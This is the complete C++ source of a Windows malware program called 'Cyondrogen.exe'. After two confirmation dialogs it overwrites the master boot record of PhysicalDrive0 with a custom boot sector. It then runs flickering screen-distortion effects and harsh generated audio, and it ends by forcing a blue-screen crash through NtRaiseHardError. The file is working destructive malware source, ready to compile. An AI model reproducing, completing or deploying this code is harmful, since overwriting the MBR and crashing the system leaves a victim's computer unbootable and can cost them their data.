#include <windows.h>
#include <windows.h>
#define _USE_MATH_DEFINES 1
#include <cmath>
#define RGBBRUSH (DWORD)0x1900ac010e
#include <intrin.h>
#pragma comment(lib, "winmm.lib")
#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "kernel32.lib")
#define winapi WINAPI
#define lpvoid LPVOID
#define dword DWORD
#define ulonglong ULONGLONG
#define uint UINT
#define rdtsc __rdtsc


//externing rtladjustprivilege
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN);
//externing ntraiseharderror
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask, PULONG_PTR Parameters, ULONG ValidRespnseOption, PULONG Response);
const unsigned char MasterBootRecord[] = {0xb8, 0x13, 0x00, 0xcd, 0x10, 0xb8, 0x00, 0xa0, 0x8e, 0xd8, 0x8e, 0xc0,
0xfc, 0x31, 0xc9, 0x51, 0xe5, 0x40, 0x50, 0xb4, 0x18, 0x50, 0x50, 0xb1,
0x04, 0x51, 0x51, 0x89, 0xe5, 0xbb, 0x00, 0xff, 0x88, 0xd8, 0x04, 0x11,
0x3c, 0x22, 0x72, 0x06, 0x24, 0x0e, 0xb0, 0x00, 0x75, 0x02, 0xb0, 0x80,
0x88, 0x07, 0x43, 0x75, 0xeb, 0xb1, 0x0c, 0x88, 0x4e, 0x0b, 0xbf, 0x22,
0xff, 0xb2, 0x0c, 0xe8, 0x7a, 0x01, 0xc6, 0x01, 0x80, 0xe8, 0x74, 0x01,
0xc6, 0x01, 0xc0, 0x83, 0xc7, 0x10, 0xe2, 0xef, 0xe8, 0x7c, 0x01, 0x80,
0xe2, 0x1f, 0x75, 0x54, 0xe8, 0x0e, 0x01, 0xe8, 0x43, 0x01, 0x89, 0xd9,
0xb3, 0x00, 0x80, 0x3f, 0xc0, 0x72, 0x42, 0x39, 0xcb, 0x75, 0x11, 0xc6,
0x04, 0x0c, 0x83, 0xc6, 0x17, 0x74, 0x99, 0x73, 0xf6, 0x56, 0xe8, 0x56,
0x01, 0x5e, 0xeb, 0xef, 0x89, 0xdf, 0x88, 0xd8, 0x88, 0xcc, 0xba, 0x0f,
0x0f, 0x21, 0xc2, 0x31, 0xd0, 0x38, 0xc4, 0x74, 0x08, 0x8d, 0x7f, 0x10,
0x73, 0x03, 0x8d, 0x7f, 0xf0, 0x38, 0xd6, 0x74, 0x05, 0x4f, 0x72, 0x02,
0x47, 0x47, 0x80, 0x3d, 0x00, 0x75, 0x06, 0x8a, 0x07, 0xc6, 0x07, 0x00,
0xaa, 0x43, 0x75, 0xb6, 0xbf, 0x27, 0x00, 0x8d, 0x45, 0xec, 0x03, 0x46,
0x02, 0xe8, 0xb1, 0x00, 0xe8, 0xd5, 0x00, 0x73, 0xfb, 0xb9, 0x04, 0x12,
0x74, 0x1f, 0xb5, 0x20, 0x83, 0xff, 0x14, 0x75, 0x18, 0x80, 0x7e, 0x0a,
0x01, 0x74, 0x12, 0xe8, 0xcf, 0x00, 0xfe, 0x07, 0x80, 0x3f, 0xc3, 0x75,
0x08, 0xc6, 0x07, 0x00, 0xfe, 0x4e, 0x0b, 0x74, 0x90, 0x8d, 0x45, 0x0c,
0xe8, 0x8f, 0x00, 0xf7, 0xe6, 0x88, 0xe3, 0x88, 0xd7, 0x43, 0xb8, 0x00,
0x08, 0x99, 0xf7, 0xf3, 0x3d, 0xc6, 0x00, 0x72, 0x03, 0xb8, 0xc6, 0x00,
0x89, 0xc6, 0xd3, 0xe8, 0x00, 0xe8, 0x93, 0x57, 0x49, 0xd3, 0xe7, 0xb8,
0xc8, 0x00, 0x29, 0xf0, 0xd1, 0xe8, 0x50, 0x56, 0x91, 0x8a, 0x46, 0x0a,
0xe8, 0x98, 0x00, 0x93, 0x59, 0xe8, 0x93, 0x00, 0xb0, 0x03, 0x59, 0xe8,
0x8d, 0x00, 0x5f, 0x4f, 0x79, 0x89, 0xb4, 0x02, 0xcd, 0x16, 0x8b, 0x5e,
0x02, 0xa8, 0x04, 0x74, 0x02, 0x4b, 0x4b, 0xa8, 0x08, 0x74, 0x02, 0x43,
0x43, 0xb4, 0x01, 0xa8, 0x01, 0x74, 0x07, 0xf6, 0xc7, 0x01, 0x75, 0x02,
0xb4, 0x07, 0x88, 0x66, 0x0a, 0x88, 0xc7, 0x89, 0x5e, 0x02, 0xa8, 0x02,
0x74, 0x14, 0x93, 0xe8, 0x13, 0x00, 0xe8, 0x37, 0x00, 0x72, 0x0b, 0x83,
0xfe, 0x04, 0x75, 0xf6, 0x89, 0x56, 0x06, 0x89, 0x5e, 0x04, 0xe9, 0xe7,
0xfe, 0x31, 0xf6, 0x8b, 0x56, 0x06, 0x50, 0xe8, 0x04, 0x00, 0x91, 0x58,
0x04, 0x20, 0xa8, 0x40, 0x9c, 0xa8, 0x20, 0x74, 0x02, 0x34, 0x1f, 0x83,
0xe0, 0x1f, 0xbb, 0xdc, 0x7d, 0x2e, 0xd7, 0x9d, 0x74, 0x02, 0xf7, 0xd8,
0x8b, 0x5e, 0x04, 0xc3, 0x46, 0x01, 0xca, 0x01, 0xc3, 0x53, 0x51, 0xe8,
0x07, 0x00, 0x8a, 0x1f, 0xd0, 0xe3, 0x59, 0x5b, 0xc3, 0x88, 0xf3, 0xb1,
0x04, 0xd2, 0xeb, 0x80, 0xe7, 0xf0, 0x08, 0xfb, 0xb7, 0xff, 0xc3, 0x88,
0xc4, 0xab, 0xab, 0xab, 0xab, 0x81, 0xc7, 0x38, 0x01, 0xe2, 0xf6, 0xc3,
0xb0, 0xfb, 0xf6, 0x66, 0x08, 0x04, 0x53, 0x88, 0x46, 0x08, 0xb4, 0x00,
0xf6, 0xf2, 0x88, 0xe3, 0xb7, 0x00, 0xc3, 0xb4, 0x00, 0xcd, 0x1a, 0x3b,
0x56, 0x00, 0x74, 0xf7, 0x89, 0x56, 0x00, 0xc3, 0x00, 0x09, 0x16, 0x24,
0x31, 0x3e, 0x47, 0x53, 0x60, 0x6c, 0x78, 0x80, 0x8b, 0x96, 0xa1, 0xab,
0xb5, 0xbb, 0xc4, 0xcc, 0xd4, 0xdb, 0xe0, 0xe6, 0xec, 0xf1, 0xf5, 0xf7,
0xfa, 0xfd, 0xff, 0xff, 0x4f, 0x4f, 0x55, 0xaa
};

void mbr()
{    
    DWORD dwBytesWritten;
    HANDLE hDevice = CreateFileW(
        L"\\\\.\\PhysicalDrive0", GENERIC_ALL,
        FILE_SHARE_READ | FILE_SHARE_WRITE, 0,
        OPEN_EXISTING, 0, 0);
    WriteFile(hDevice, MasterBootRecord, 512, &dwBytesWritten, 0);
    CloseHandle(hDevice);
}

DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
xs = dwSeed;
}
DWORD xorshift32() {
	xs ^= xs << 13;
	xs ^= xs << 17;
	xs ^= xs << 5;
	return xs;
}
DWORD WINAPI cubes(LPVOID lpParam)
{
    int hSrc;
    int wSrc;
    HDC hdcDest;
    GetDC(0);
    wSrc = GetSystemMetrics(0);
    for (hSrc = GetSystemMetrics(1);
        ;
        StretchBlt(hdcDest, -10, -10, wSrc + 20, hSrc + 20, hdcDest, 0, 0, wSrc, hSrc, 0xCC0020u))
    {
        hdcDest = GetDC(0);
        (hdcDest, 4);
        StretchBlt(hdcDest, 10, 10, wSrc - 20, hSrc - 20, hdcDest, 0, 0, wSrc, hSrc, 0xCC0020u);
    }
}
DWORD WINAPI squares(LPVOID lpParam){
	int w = GetSystemMetrics(0), h = GetSystemMetrics(1);
	int signX = 1;
    int signY = 1;
    int signX1 = 1;
    int signY1 = 1;
    int incrementor = 10;
    int x = 10;
    int y = 10;
	while(1){
		HDC hdc = GetDC(0);
        x += incrementor * signX;
        y += incrementor * signY;
		int top_x = 0 + x;
        int top_y = 0 + y;
        int bottom_x = 100 + x;
        int bottom_y = 100 + y; 
    	HBRUSH brush = CreateSolidBrush(RGB(rand() % 255, rand() % 255, rand() % 255));
    	SelectObject(hdc, brush);
		Rectangle(hdc, top_x, top_y, bottom_x, bottom_y);
        if (y >= GetSystemMetrics(SM_CYSCREEN))
        {
                signY = -1;
        }
        if (x >= GetSystemMetrics(SM_CXSCREEN))
        {
            signX = -1;
        }
        if (y == 0)
        {
            signY = 1;
        }
        if (x == 0)
        {
            signX = 1;
        }
        Sleep(10);
    	DeleteObject(brush);
        ReleaseDC(0, hdc);
	}
}
DWORD WINAPI sines(LPVOID lpParam) {
  HDC desk = GetDC(0); HWND wnd = GetDesktopWindow();
  int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
  double angle = 0;
  while (1) {
    desk = GetDC(0);
    for (float i = 0; i < sw + sh; i += 0.99f) {
      int a = sin(angle) * 20;
      BitBlt(desk, 0, i, sw, 1, desk, a, i, SRCCOPY);
      angle += M_PI / 40;
      DeleteObject(&i); DeleteObject(&a);
    }
    ReleaseDC(wnd, desk);
    DeleteDC(desk); DeleteObject(&sw); DeleteObject(&sh); DeleteObject(&angle);
  }
}
DWORD WINAPI payload4(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	int rx;
	for (int i = 0;; i++) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		rx = xorshift32() % sw;
		int ry = xorshift32() % sh;
		SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, RGBBRUSH);
		BitBlt(desk, 10, ry, sw, 96, desk, 0, ry, RGBBRUSH);
		BitBlt(desk, -10, ry, sw, -96, desk, 0, ry, RGBBRUSH);
		Sleep(1);
	}
}
DWORD WINAPI colors(LPVOID lpParam)
{
	while(1){
    HDC hdc = GetDC(NULL);
    int w = GetSystemMetrics(SM_CXSCREEN),
        h = GetSystemMetrics(SM_CYSCREEN);

    HBRUSH brush = CreateSolidBrush(RGB(rand() % 100, rand() % 100, rand() % 100));
    SelectObject(hdc, brush);
    PatBlt(hdc, 0, 0, w, h, PATINVERT);
    DeleteObject(brush);
    ReleaseDC(NULL, hdc);
	}
}
DWORD WINAPI rotate(LPVOID lpParam)
{
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    RECT rekt;POINT wPt[3];
    while (1) {
        GetWindowRect(GetDesktopWindow(), &rekt);
        wPt[0].x = rand()%sw; wPt[0].y = rand() % sh;
        wPt[1].x = rand() % sw; wPt[1].y = rand() % sh;
        wPt[2].x = rand() % sw; wPt[2].y = rand() % sh;
        PlgBlt(desk, wPt, desk, rekt.left, rekt.top, rekt.right - rekt.left, rekt.bottom - rekt.top, 0, 0, 0);
    }
}
DWORD WINAPI shuffle(LPVOID lpParam)
{
	HDC desk = GetDC(NULL);

    const int sw = GetSystemMetrics(SM_CXSCREEN);
    const int sh = GetSystemMetrics(SM_CYSCREEN);

    while(true)
    {
		HDC desk = GetDC(NULL);
        int a = rand() % sw, b = rand() % sh;
        BitBlt(desk, a, b, 200, 200, desk, a + rand() % 21 - 10, b + rand() % 21 - 10, SRCCOPY);
    }
}
DWORD WINAPI payload2(LPVOID lpParam) {
	HDC desk = GetDC(0);
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
	while (1) {
		SeedXorshift32(__rdtsc());
		desk = GetDC(0);
		SelectObject(desk, CreateHatchBrush(xorshift32() % 7, RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
		Ellipse(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Rectangle(desk, xorshift32() % sw, xorshift32() % sh, xorshift32() % sw, xorshift32() % sh);
		Sleep(20);
	}
}

VOID WINAPI sound1() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*(t>>5|t>>8))>>(t>>16);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound2() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t * (t ^ t + (t >> 8 | 1) / (t - 12800 ^ t) >> 10) );

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound3() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 8000, 8000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[8000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>((t << 1) ^ ((t << 1) + (t >> 7) & t >> 12)) | t >> (4 - (1 ^ 7 & (t >> 19))) | t >> 7;

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound4() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t>>(t/768));

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
VOID WINAPI sound5() {
    HWAVEOUT hWaveOut = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 32000, 32000, 1, 8, 0 };
    waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[32000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*t>>t);

    WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
    waveOutClose(hWaveOut);
}
int main(){
    if (MessageBoxW(NULL, L"The software you just executed is considered malware.\r\n\
This malware will harm your computer and makes it unusable.\r\n\
If you are seeing this message without knowing what you just executed, simply press No and nothing will happen.\r\n\
If you know what this malware does and are using a safe environment to test, \
press Yes to start it.\r\n\r\n\
DO YOU WANT TO EXECUTE THIS MALWARE, RESULTING IN AN UNUSABLE MACHINE?", L"Cyondrogen.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
    {
        ExitProcess(0);
    }
    else
    {
        if (MessageBoxW(NULL, L"THIS IS THE LAST WARNING!\r\n\r\n\
THE CREATOR IS NOT RESPONSIBLE FOR ANY DAMAGE MADE USING THIS MALWARE!\r\n\
STILL EXECUTE IT?", L"Cyondrogen.exe", MB_YESNO | MB_ICONEXCLAMATION) == IDNO)
        {
            ExitProcess(0);
        }
        else
        {
        	mbr();
        	HANDLE thread1 = CreateThread(0, 0, cubes, 0, 0, 0);
        	HANDLE thread2 = CreateThread(0, 0, squares, 0, 0, 0);
        	sound1();
        	Sleep(30000);
        	TerminateThread(thread1, 0);
            CloseHandle(thread1);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread3 = CreateThread(0, 0, sines, 0, 0, 0);
        	sound2();
        	Sleep(30000);
        	TerminateThread(thread3, 0);
            CloseHandle(thread3);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread4 = CreateThread(0, 0, colors, 0, 0, 0);
            HANDLE thread4dot1 = CreateThread(0, 0, rotate, 0, 0, 0);
            sound3();
        	Sleep(30000);
        	TerminateThread(thread4, 0);
            CloseHandle(thread4);
            InvalidateRect(0, 0, 0);
         TerminateThread(thread4dot1, 0);
            CloseHandle(thread4dot1);
            InvalidateRect(0, 0, 0);
            Sleep(1000);
            HANDLE thread5 = CreateThread(0, 0, payload4, 0, 0, 0);
            sound4();
        	Sleep(30000);
        	TerminateThread(thread5, 0);
            CloseHandle(thread5);
            InvalidateRect(0, 0, 0);
            Sleep(1200);
            HANDLE thread6 = CreateThread(0, 0, shuffle, 0, 0, 0);
            HANDLE thread7 = CreateThread(0, 0, payload2, 0, 0, 0);
            sound5();
        	Sleep(30000);
			//boolean
			BOOLEAN b;
			//bsod response
			unsigned long response;
			//process privilege
			RtlAdjustPrivilege(19, true, false, &b);
			//call bsod
			NtRaiseHardError(0xC0000122, 0, 0, 0, 6, &response);
			Sleep(-1);
		}
	}
}
